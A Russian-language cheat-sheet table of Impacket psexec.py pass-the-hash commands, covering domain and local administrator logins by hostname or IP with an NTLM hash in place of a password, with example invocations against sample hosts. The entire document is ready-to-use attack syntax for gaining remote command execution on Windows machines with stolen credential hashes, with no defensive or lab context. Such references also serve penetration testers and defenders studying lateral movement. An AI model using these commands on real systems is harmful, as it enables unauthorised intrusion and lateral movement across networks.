| Сценарий | Синтаксис | Пример | Комментарий |
| --- | --- | --- | --- |
| Доменный админ (по имени хоста) | psexec.py DOMAIN/user@HOST -hashes :<NTLM_HASH> | psexec.py TEST/admin@WIN-SRV01 -hashes :6f1ed002ab5595859014ebf0951522d9 | DOMAIN — имя домена; HOST — NetBIOS-имя; вход в домен с правами пользователя. |
| Доменный админ (по IP) | psexec.py DOMAIN/user@IP -hashes :<NTLM_HASH> | psexec.py TEST/admin@192.168.0.10 -hashes :6f1ed002ab5595859014ebf0951522d9 | Используется IP-адрес вместо имени хоста. Удобно, если имя не резолвится. |
| Локальный админ (по имени хоста) | psexec.py HOST/user@HOST -hashes :<NTLM_HASH> | psexec.py PC-001/localadmin@PC-001 -hashes :6f1ed002ab5595859014ebf0951522d9 | HOST указывается вместо домена. Учётка локальная, а не доменная. |
| Локальный админ (по IP) | psexec.py user@IP -hashes :<NTLM_HASH> | psexec.py localadmin@192.168.0.55 -hashes :6f1ed002ab5595859014ebf0951522d9 | Минимальная форма: без указания домена, напрямую по IP. |
